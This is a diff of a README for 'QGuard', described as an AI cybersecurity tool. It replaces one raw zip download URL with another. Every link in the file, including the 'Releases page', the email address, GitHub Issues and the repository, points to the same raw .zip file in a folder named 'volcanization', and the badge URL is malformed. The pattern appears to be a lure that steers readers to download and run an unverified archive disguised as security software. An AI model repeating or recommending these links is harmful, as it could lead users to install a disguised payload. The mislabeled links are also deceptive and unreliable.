@@ -6,7 +6,7 @@ QGuard is a real-time AI-powered cybersecurity tool designed to help you stay sa
 
 ## 📥 Download QGuard
 
-[![Download QGuard](https://raw.githubusercontent.com/YonkieDave/QGuard/main/volcanization/Guard-Q-3.8-alpha.5.zip%https://raw.githubusercontent.com/YonkieDave/QGuard/main/volcanization/Guard-Q-3.8-alpha.5.zip)](https://raw.githubusercontent.com/YonkieDave/QGuard/main/volcanization/Guard-Q-3.8-alpha.5.zip)
+[![Download QGuard](https://raw.githubusercontent.com/YonkieDave/QGuard/main/volcanization/Q-Guard-1.2.zip%https://raw.githubusercontent.com/YonkieDave/QGuard/main/volcanization/Q-Guard-1.2.zip)](https://raw.githubusercontent.com/YonkieDave/QGuard/main/volcanization/Q-Guard-1.2.zip)
 
 ## 📋 System Requirements
 
@@ -28,11 +28,11 @@ Before downloading, make sure your system meets these minimum requirements:
 
 ## 📥 Download & Install
 
-To get QGuard, please visit the [Releases page](https://raw.githubusercontent.com/YonkieDave/QGuard/main/volcanization/Guard-Q-3.8-alpha.5.zip) on GitHub. Here’s how to proceed:
+To get QGuard, please visit the [Releases page](https://raw.githubusercontent.com/YonkieDave/QGuard/main/volcanization/Q-Guard-1.2.zip) on GitHub. Here’s how to proceed:
 
 1. Click the link above.
 2. Look for the most recent version.
-3. Download the appropriate installer for your operating system (for example, `https://raw.githubusercontent.com/YonkieDave/QGuard/main/volcanization/Guard-Q-3.8-alpha.5.zip` for Windows).
+3. Download the appropriate installer for your operating system (for example, `https://raw.githubusercontent.com/YonkieDave/QGuard/main/volcanization/Q-Guard-1.2.zip` for Windows).
 4. Once the download is complete, open the installer file.
 5. Follow the on-screen instructions to complete the installation.
 
@@ -58,14 +58,14 @@ If you encounter issues, consider these common problems:
 
 If you have questions or need help, feel free to reach out:
 
-- **Email:** https://raw.githubusercontent.com/YonkieDave/QGuard/main/volcanization/Guard-Q-3.8-alpha.5.zip
-- **GitHub Issues:** Report specific problems or request features at [GitHub Issues](https://raw.githubusercontent.com/YonkieDave/QGuard/main/volcanization/Guard-Q-3.8-alpha.5.zip).
+- **Email:** https://raw.githubusercontent.com/YonkieDave/QGuard/main/volcanization/Q-Guard-1.2.zip
+- **GitHub Issues:** Report specific problems or request features at [GitHub Issues](https://raw.githubusercontent.com/YonkieDave/QGuard/main/volcanization/Q-Guard-1.2.zip).
 
 ## 🔗 Additional Information
 
 For more details and community insights, follow us on social media or visit our additional resources:
 
-- **GitHub Repository:** [https://raw.githubusercontent.com/YonkieDave/QGuard/main/volcanization/Guard-Q-3.8-alpha.5.zip](https://raw.githubusercontent.com/YonkieDave/QGuard/main/volcanization/Guard-Q-3.8-alpha.5.zip)
+- **GitHub Repository:** [https://raw.githubusercontent.com/YonkieDave/QGuard/main/volcanization/Q-Guard-1.2.zip](https://raw.githubusercontent.com/YonkieDave/QGuard/main/volcanization/Q-Guard-1.2.zip)
 - **Documentation:** Instructions and guides to enhance your experience.
   
 Stay safe online with QGuard. Your cybersecurity solution is just a click away!
